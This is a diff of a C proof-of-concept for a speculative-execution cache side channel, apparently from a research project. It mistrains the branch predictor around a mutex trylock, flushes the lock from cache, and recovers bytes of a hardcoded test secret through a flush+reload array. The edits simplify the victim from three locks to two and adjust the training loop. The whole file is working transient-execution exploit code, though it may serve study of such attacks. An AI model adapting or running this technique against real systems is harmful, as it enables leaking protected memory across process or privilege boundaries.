@@ -11,7 +11,7 @@
 #define REPETITIONS 10
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-#define SECRET_SIZE 8
+#define SECRET_SIZE 9
 #define N_TRAINING 10
 #define SECRET "mysecret"
 #define false 0
@@ -25,63 +25,49 @@ cp_t* flush_reload_arr;
 
 void attack_func(pthread_mutex_t* lock_ptr, int secret_index) {
     if(pthread_mutex_trylock(lock_ptr) != 0) return;
-
     volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
     pthread_mutex_unlock(lock_ptr);
 }
 
 void victim_func(int lock_index, int secret_index) {
 
-    //creates 3 locks. put addresses in array to prevent branches (fools branch predictor).
-    pthread_mutex_t k, l, m;
-    pthread_mutex_init(&k, FLAG);
-    pthread_mutex_init(&l, FLAG);
-    pthread_mutex_init(&m, FLAG);
-    int  k_idx = 0;
-    int  l_idx = 1;
-    int  m_idx = 2;
-    int  n_locks = 3;
-    pthread_mutex_t* klm_addresses[n_locks];
-    klm_addresses[k_idx] = &k;
-    klm_addresses[l_idx] = &l;
-    klm_addresses[m_idx] = &m;
+    //creates 2 locks. put addresses in array to prevent branches (fools branch predictor).
+    pthread_mutex_t lock0, lock1;
+    pthread_mutex_init(&lock0, FLAG);
+    pthread_mutex_init(&lock1, FLAG);
+    int n_locks = 2;
+    pthread_mutex_t* lock01_addresses[n_locks];
+    lock01_addresses[0] = &lock0;
+    lock01_addresses[1] = &lock1;
 
-    //lock either k,l or m, depending on the parameter. Branch predictor cannot determine which (no branches).
-    pthread_mutex_t* klm_address = klm_addresses[lock_index];
-    pthread_mutex_lock(klm_address);
-    //[lock_index] = true;
+    //lock either lock0 or lock1, depending on the parameter. Branch predictor cannot determine which (no branches).
+    pthread_mutex_t* lock01_address = lock01_addresses[lock_index];
+    pthread_mutex_lock(lock01_address);
 
     //Remove locked[k_idx] from cache, so that the branch will speculatively execute.
     cpuid();
-    flush((void*)klm_addresses[k_idx]);
+    flush(lock01_addresses[0]);
     cpuid();
 
-
-    attack_func(&k, secret_index);
-    /*pthread_mutex_lock(&k); //TODO: check if this works normally, otherwise configure
-    volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
-    pthread_mutex_unlock(&k);//*/
-
+    attack_func(&lock0, secret_index);
 
     cpuid();
-
-    pthread_mutex_unlock(klm_address);
-    pthread_mutex_destroy(&k);
-    pthread_mutex_destroy(&l);
-    pthread_mutex_destroy(&m);
+    pthread_mutex_unlock(lock01_address);
+    pthread_mutex_destroy(&lock0);
+    pthread_mutex_destroy(&lock1);
 }
 
 int* prepare(int secret_index) {
 
     flush_reload_arr = init_flush_reload(N_PAGES);
-    flush_arr((void*)flush_reload_arr, N_PAGES);
+    flush_arr(flush_reload_arr, N_PAGES);
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
     int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
     char lock_indices[n_accesses];
     char secret_indices[n_accesses];
     for(int i = 0; i < n_accesses; i++) {
-        lock_indices[i] = 2;
+        lock_indices[i] = 1;
         secret_indices[i] = 0;
     }
     lock_indices[n_accesses-1] = 0;
@@ -92,7 +78,7 @@ int* prepare(int secret_index) {
         //if(DBG) printf("%d:\lock %d\tsecret %d\n", i, lock_indices[i], secret_indices[i]);
         victim_func(lock_indices[i], secret_indices[i]);
         cpuid();
-        if(lock_indices[i] != 0) {
+        if(i < n_accesses-1) {
             cpuid();
             flush_arr(flush_reload_arr, N_PAGES);
         }
@@ -123,5 +109,4 @@ int main(int argc, char** argv) {
     print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);
 
     free_results(results, REPETITIONS, SECRET_SIZE);
-
 }
